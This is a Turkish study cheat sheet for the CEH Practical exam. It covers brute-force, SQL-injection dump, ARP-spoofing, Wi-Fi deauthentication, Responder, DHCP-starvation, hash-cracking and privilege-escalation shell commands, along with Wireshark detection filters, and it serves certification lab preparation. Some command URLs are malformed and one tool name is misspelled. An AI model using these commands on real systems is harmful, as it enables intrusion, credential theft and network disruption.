# CEH v13 Practical - Ultra Cheat Sheet (Kapsamlı Sınav El Kitabı)

Bu doküman, CEH v13 Practical sınavında en az 15+ doğru çıkararak sınavı başarıyla geçmeniz için tasarlanmış; güncel komut, port, GUI araç ve analiz kılavuzlarının tek parça birleşimidir.

---

## 🚨 BÖLÜM 1: KRİTİK VERİTABANI (DB) VE SERVİS PORTLARI

Sınavda hedef taramalarında bu portları gördüğünüzde doğrudan servis türünü ve amacını teşhis etmeniz gerekir:

*   **Port 389 / 636 (SSL):** LDAP / Active Directory -> Ağda bu portu açık olan makine **Domain Controller (DC)**'dır. Domain FQDN bilgisi buradan çekilir.
*   **Port 445:** SMB (Server Message Block) -> Kimlik bilgisi sızdırma, kaba kuvvet ve EternalBlue (MS17-010) zafiyetleri için ilk hedeftir.
*   **Port 1433:** MSSQL (Microsoft SQL Server veritabanı).
*   **Port 1521:** Oracle Database.
*   **Port 3306:** MySQL veritabanı.
*   **Port 3389:** RDP (Remote Desktop) -> Uzaktan masaüstü erişimi ve kaba kuvvet soruları.
*   **Port 5432:** PostgreSQL veritabanı.
*   **Port 27017:** MongoDB (NoSQL veritabanı).
*   **Default RAT Portları:** ProRAT -> `5110` | Theef -> `6703` | NjRAT -> `5552` veya `1177`.

---

## 🔬 BÖLÜM 2: WIRESHARK TRAFİK ANALİZİ (PCAP SEARCH DURUMLARI)

Size hazır verilen `.pcap` veya `.pcapng` dosyalarındaki soruları çözmek için arama çubuğuna yazılacak filtreler:

### 1. Genel Protokol ve IP Filtreleri
*   `ip.addr == 10.10.10.5` -> Kaynak veya hedef fark etmeksizin bu IP'yi içeren tüm paketler.
*   `ip.src == 10.10.10.5 && ip.dst == 10.10.10.20` -> Sadece 10.5'ten çıkıp 10.20'ye giden trafik.
*   `tcp.port == 4444` -> TCP 4444 portunu kullanan (Genelde Reverse Shell) paketler.
*   `ftp` veya `ftp-data` -> FTP üzerinden sızdırılan dosyaları ve giriş bilgilerini bulmak için `USER` ve `PASS` komutlarının gittiği paketleri izleyin.
*   `http.user_agent contains "nmap"` -> Saldırganın veya tarama yapan IP'nin tarayıcı kimliğini kanıtlar.

### 2. Şifre ve Form Verisi Avı (HTTP POST)
*   `http.request.method == "POST"` -> Sunucuya gönderilen tüm form, giriş ve veri paketlerini listeler.
*   `http contains "password"` veya `http contains "login"` -> Düz metin olarak bu kelimelerin geçtiği paketler.
*   *İpucu:* Bulduğunuz şüpheli pakete sağ tıklayıp **Follow -> HTTP Stream** (veya TCP Stream) seçeneğini seçerek şifreleri açık metin okuyun.

### 3. Saldırı Türü ve Anomali Tespit Filtreleri
*   **TCP SYN Flood (DDoS/Port Tarama):** `tcp.flags.syn == 1 && tcp.flags.ack == 0` (Milisaniyeler içinde tek IP'den binlerce istek geliyorsa o IP saldırgandır).
*   **ICMP (Ping) Flood:** `icmp.type == 8` (Echo Request) veya `icmp.type == 0` (Echo Reply)
*   **ARP Poisoning (Zehirleme) Tespiti:** Üst menüden **Analyze -> Expert Information** penceresini açın. **"Duplicate IP address configured"** veya **"ARP move"** uyarılarını arayın. Ya da filtreye `arp` yazıp aynı MAC adresinin birden fazla IP için cevap verdiğini (`is-at`) doğrulayın.
*   **DHCP Starvation Tespiti:** Filtreye `dhcp` veya `bootp` yazın. Milisaniyeler içinde akan, kaynak IP'si `0.0.0.0` olan ama içindeki **Client MAC address** alanı sürekli rastgele değişen binlerce `DHCP Discover` paketi bu saldırıyı kanıtlar.

---

## 💻 BÖLÜM 3: CLI (TERMINAL) KOMUTLARI VE PARAMETRE ANLAMLARI

### 1. NMAP (Ağ Keşfi ve Port Tarama)
```bash
nmap -sS -sV -sC -p- -T4 --script=ldap-rootdse -oN tarama.txt 10.10.10.5
```
*   `-sS`: SYN Scan (Stealth). Hızlı ve yarım bağlantılı tarama yapar.
*   `-sV`: Version Detection. Açık porttaki servisin sürümünü (Örn: Apache 2.4) öğrenir.
*   `-sC`: Default Scripts. Nmap'in hazır zafiyet ve keşif betiklerini çalıştırır.
*   `-p-`: 1 ile 65535 arasındaki tüm portları tarar (Gizli portları kaçırmamak için şarttır).
*   `-T4`: Taramayı hızlandırır (Sınav laboratuvarı için ideal hız şablonu).
*   `--script=ldap-rootdse`: Hedef Active Directory ise domain adını (FQDN) çeker.
*   `-oN dosya.txt`: Sonuçları normal metin formatında kaydeder.

### 2. GOBUSTER & FFUF (Web Dizin ve Dosya Keşfi)
```bash
# Gobuster dizin ve uzantı taraması
gobuster dir -u http://10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -k

# ffuf ile hızlı fuzzing ve HTTP 200/301 filtreleme
ffuf -u http://10.10.10FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301
```
*   `dir`: Dizin arama modu.
*   `-w`: Kelime listesi (Wordlist) yolu.
*   `-x`: Aranacak dosya uzantıları (`flag.txt` yakalamak için kritik).
*   `-k`: SSL/TLS sertifika hatalarını yok sayar.
*   `-mc`: Sadece belirtilen HTTP durum koduna sahip sonuçları ekrana basar.

### 3. HYDRA (Kaba Kuvvet Saldırısı)
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ftp -V -f
```
*   `-L`: Kullanıcı adı listesi (Tek kullanıcı için küçük `-l admin`).
*   `-P`: Şifre kelime listesi (Tek şifre için küçük `-p password`).
*   `ftp`: Saldırı yapılacak servis (`ssh`, `smb`, `rdp` yazılabilir).
*   `-V`: Verbose mod. Denenen tüm kombinasyonları gösterir.
*   `-f`: Doğru şifre bulunduğu anda saldırıyı durdurur (Zaman kazandırır).

### 4. SQLMAP (Otomatik SQL Enjeksiyonu)
```bash
# Adım 1: Veritabanlarını listeleme
sqlmap -u "http://10.10.10item.php?id=1" --dbs --batch

# Adım 2: Tabloları ve veriyi çekme
sqlmap -u "http://10.10.10item.php?id=1" -D hedef_db -T users --dump --batch
```
*   `-u`: Parametreli hedef URL.
*   `--dbs`: Mevcut veritabanlarını gösterir.
*   `--batch`: Sınavda sorulacak tüm onay sorularına otomatik "Evet" cevabı verir.
*   `--dump`: Tablodaki verileri terminale döker.

---

## 📱 BÖLÜM 4: ADVANCED SALDIRI MODÜLLERİ (ADB, WI-FI, CLOUD, AD, MITM)

### 1. Android Hacking (ADB)
```bash
adb connect 10.10.10.150:5555                # Cihaza uzaktan bağlanma
adb devices                                  # Bağlı cihazları listeleme
adb shell                                    # Cihaz içinde terminal açma
adb pull /sdcard/Download/flag.txt ./        # Cihazdan bilgisayara dosya çekme
adb push exploit.apk /sdcard/Download/       # Cihaza dosya yükleme
adb shell pm list packages                   # Kurulu paketleri listeleme
```

### 2. Wi-Fi Hacking (Aircrack-ng Ailesi)
```bash
airmon-ng start wlan0                         # Ağ kartını izleme (Monitor) moduna alma
airodump-ng wlan0mon                          # Ağları tarama
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon # Handshake izleme
aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon           # Kullanıcıyı ağdan düşürme
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap # Şifreyi kırma
```

### 3. Cloud Güvenliği (AWS S3)
```bash
aws configure                                # Kimlik tanımlama
aws s3 ls s3://hedef-bucket-adi --no-sign-request # Açık kovayı listeleme
aws s3 cp s3://hedef-bucket-adi/flag.txt . --no-sign-request # Dosyayı indirme
s3scanner scan --bucket hedef-bucket-adi      # Toplu bucket taraması
```

### 4. Dahili Ağ & Active Directory (LLMNR / Responder / Kerberos)
```bash
# Responder ile LLMNR/NBT-NS Protokol Zehirlemesi (Hash Yakalama)
sudo responder -I eth0 -dwv

# Impacket ile AS-REP Roasting Saldırısı
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# CrackMapExec ile SMB Taraması ve Hak Kontrolü
crackmapexec smb 10.10.10.0/24 -u admin -p 'Sifre123!'
```

### 5. ARP Poisoning (Ortadaki Adam - MitM)
```bash
# IP Yönlendirmeyi açın (Şarttır)
sudo sysctl -w net.ipv4.ip_forward=1

# Terminal 1: Kurbana kendinizi Gateway gibi gösterin
sudo arpspoof -i eth0 -t 10.10.10.50 10.10.10.1

# Terminal 2: Gateway'e kendinizi kurban gibi gösterin
sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.50
```

### 6. DHCP Starvation (Havuz Tüketme)
```bash
# Yersinia interaktif mod üzerinden saldırı başlatma
sudo yersinia dhcp -e -G

# Doğrudan terminalden headless paket yayma saldırısı
sudo yersinia dhcp -m eth0 -attack 1

# Alternatif dhcpstarv aracı kullanımı
sudo dhcpstarv -i eth0
```

### 7. Gelişmiş Hash Kırma (Hashcat & John)
```bash
# Hashcat ile NTLM (Windows) Kırma (-m 1000)
hashcat -m 1000 -a 0 ntlm_hash.txt /usr/share/wordlists/rockyou.txt

# Hashcat ile NetNTLMv2 (Responder çıktısı) Kırma (-m 5600)
hashcat -m 5600 -a 0 responder.txt /usr/share/wordlists/rockyou.txt

# Hashcat ile SHA-256 Kırma (-m 1400)
hashcat -m 1400 -a 0 sha256_hash.txt /usr/share/wordlists/rockyou.txt

# Zip Dosya Şifresi Kırma
zip2john gizli.zip > zip.txt && john --wordlist=/usr/share/wordlists/rockyou.txt zip.txt
```

### 8. Steganografi ve Kriptoloji (CLI)
```bash
# Snow aracı ile boşluk karakterli gizli metin çözme
snow -C -p "sifre_varsa" gizli.txt rapor.txt

# Steghide ile resimden veri çıkarma
steghide extract -sf sakli_resim.jpg -p 'parola'

# Stegcracker ile brute-force stego çözme
stgcracker sakli_resim.jpg /usr/share/wordlists/rockyou.txt

# Zsteg ile PNG/BMP gizli katman analizi
zsteg -a gizli.png

# ExifTool ile görünmeyen metaverileri okuma
exiftool supheli_dosya.pdf

# OpenSSL ile AES-256 Dosya Şifresi Çözme
openssl enc -aes-256-cbc -d -in sifreli.enc -out cozulmus.txt -k gizlisifre
```
---

## ☣️ BÖLÜM 5: ZARARLI YAZILIM ANALİZİ (MALWARE ANALYSIS)

### 1. Windows GUI Araçları Adım Adım Kullanımı

#### A. Pestudio (Statik Analiz)
1. **Pestudio** uygulamasını açın.
2. Şüpheli `.exe` veya `.dll` dosyasını sürükleyip programın içine bırakın.
3. Sol menüdeki sekmelerden şu kritik bilgileri toplayın:
   * **Properties:** Dosyanın **MD5, SHA-1, SHA-256** hash değerleri.
   * **Indicators:** Dosyanın zararlı davranış ipuçları.
   * **Sections:** Paketleyici (Packer) tespiti. `.text`, `.data` yerine `UPX0`, `UPX1` varsa dosya **UPX** ile paketlenmiştir.
   * **Libraries & Imports:** `CreateRemoteThread`, `WriteProcessMemory` varsa process injection işlevidir.
   * **Strings:** Arama çubuğuna `http` yazarak bağlanmaya çalıştığı **IP veya C2 domain adlarını** bulun.

#### B. Process Monitor - ProcMon (Dinamik Analiz)
1. **ProcMon** uygulamasını açın.
2. Üst menüdeki **Filtre (Huni ikonu)** butonuna tıklayın.
3. Filtre kuralını ayarlayın: `Process Name` -> `is` -> `szupheli_dosya.exe` -> `Include` (Ekle), **Add** ve **Apply** deyin.
4. Zararlı dosyayı çalıştırın.
5. Üstteki ikonlardan **Registry (Kayıt Defteri)** ikonunu aktif tutarak zararlının kalıcılık sağlamak (Persistence) için hangi `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` anahtarına kendini eklediğini bulun.

#### C. BCTextEncoder (Şifreli Metin Çözme)
1. **BCTextEncoder** uygulamasını açın.
2. `-----BEGIN PGP MESSAGE-----` ile başlayan şifreli metni kopyalayıp ana ekrana yapıştırın.
3. **Decrypt** butonuna basın, verilen anahtar kelimeyi (Password) girip çözülen flag'i okuyun.

---

## 👑 BÖLÜM 6: HAK YÜKSELTME (PRIVILEGE ESCALATION)

### 1. Linux Hak Yükseltme (CLI)
*   **Sistem Bilgisi ve Kernel Sürümü Tespiti:**
    ```bash
    uname -a
    cat /etc/issue
    ```
*   **Mevcut Kullanıcının Sudo Yetkilerini Kontrol Etme:**
    ```bash
    sudo -l
    ```
    *Eğer çıktıda `(root) NOPASSWD: /usr/bin/perl` varsa şifresiz root olabilirsiniz:*
    ```bash
    sudo perl -e 'exec "/bin/sh";'
    ```
*   **SUID Bit'i Tanımlanmış Dosyaları Bulma:**
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```
    *Eğer `find` zafiyeti varsa (GTFOBins):*
    ```bash
    find . -exec /bin/sh -p \; -quit
    ```

### 2. Windows Hak Yükseltme (CLI & PowerShell)
*   **Mevcut Kullanıcı Ayrıcalıklarını Görme:**
    ```cmd
    whoami /priv
    ```
    *`SeImpersonatePrivilege` yetkisi **Enabled** ise **JuicyPotato** veya **PrintSpoofer** kullanılır.*
*   **Sistem Bilgilerini ve Yamaları Listeleme:**
    ```cmd
    systeminfo
    ```
*   **Zayıf Klasör İzinlerini (Unquoted Service Path) Bulma:**
    ```cmd
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
    ```
*   **Kayıt Defterinde (Registry) Açık Şifre Arama:**
    ```cmd
    reg query HKLM /f password /t REG_SZ /s
    ```

### 3. Metasploit Üzerinden Hak Yükseltme
1.  **Meterpreter Yetki Kontrolü ve Otomatik Deneme:**
    ```meterpreter
    meterpreter > getuid
    meterpreter > getsystem
    ```
2.  **Zafiyet Tarama Modülü (Local Exploit Suggester):**
    ```meterpreter
    meterpreter > background
    msf6 > use post/multi/recon/local_exploit_suggester
    msf6 > set SESSION 1
    msf6 > run
    ```
3.  **Önerilen Exploiti Çalıştırma:**
    ```msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle
    msf6 > set SESSION 1
    msf6 > set LHOST <Kendi_IP_Adresiniz>
    msf6 > run
    ```

---

## 🖼️ BÖLÜM 7: WINDOWS GUI UYGULAMALARI ADIM ADIM REHBERİ

### 1. VeraCrypt (Şifreli İmaj Mount Etme)
1. **VeraCrypt** uygulamasını açın.
2. Boş bir sürücü harfi seçin (Örn: `G:`).
3. **Select File** butonuna basarak size verilen `.vc` veya uzantısız şifreli imajı seçin.
4. Alttaki **Mount** butonuna tıklayın.
5. Soruda verilen parolayı girip **OK** deyin.
6. `Bilgisayarım` (This PC) içine girip `G:` diskinden flag dosyasını okuyun.

### 2. Nessus (Zafiyet Tarama)
1. Tarayıcıdan `https://localhost:8834` adresine gidin.
2. Giriş yaptıktan sonra **New Scan -> Basic Network Scan** seçin.
3. İsim verip **Targets** kısmına hedef IP blogunu (`10.10.10.0/24`) yazın ve **Save** deyin.
4. Listede taramanın yanındaki **Play (Launch)** butonuna basın.
5. Bitince üzerine tıklayıp **Vulnerabilities** sekmesinden kırmızı/turuncu (Critical/High) zafiyetlerin CVE kodlarını bulun.

### 3. OpenStego (Görsel Steganografi)
1. **OpenStego** programını çalıştırın.
2. Ana ekrandan **Extract Data** seçeneğine tıklayın.
3. **Input Image File** kısmından veri gizlenmiş resmi (`.png`/`.bmp`) seçin.
4. **Output Folder** kısmından çıkarılacak konumu (Masaüstü) seçin.
5. Şifre varsa girip **Extract** butonuna basın.

### 4. Ettercap GUI (Görsel ARP Zehirlemesi)
1. **Ettercap (Graphical)** uygulamasını açın.
2. Üst menüdeki **Tik (Check)** butonuna basarak ağ arayüzünü (eth0) seçip başlatın.
3. Üst araç çubuğundan **Büyüteç (Scan for hosts)** ikonuna tıklayın.
4. **Hosts -> Hosts List** yolunu izleyin.
5. **Gateway IP**'sini seçip **Add to Target 1** deyin.
6. **Kurban IP**'sini seçip **Add to Target 2** deyin.
7. Sağ üstteki **Dünya/Mitm menüsünden** **ARP poisoning** seçeneğini seçin.
8. **Sniff remote connections** kutucuğunu işaretleyip **OK** butonuna basın.

### 5. Yersinia GUI (Görsel DHCP Starvation)
1. Terminalden `sudo yersinia -G` komutu ile arayüzü açın.
2. Üst sekmelerden **DHCP** bölümünü seçin.
3. Üst menüdeki **Launch Attack** (Yıldırım/Roket) ikonuna tıklayın.
4. Açılan seçeneklerden **sending RAW packets** opsiyonunu seçip **OK** deyin.

https://www.scribd.com/document/820253578/CEH-Practical-Exam-All-You-Need-to-Know
https://www.scribd.com/document/982027254/Ceh-Practical-One-pagesheet#google_vignette
https://www.scribd.com/document/965716116/CEH-Practical-Cheat-Sheet-2025
https://github.com/drgoteee/drgoteee.github.io
https://www.netexec.wiki/
https://x3m1sec.gitbook.io/notes/my-certifications/cpts/notes
https://team-anonymous.gitbook.io/certified-red-team-professional-crtp-notes
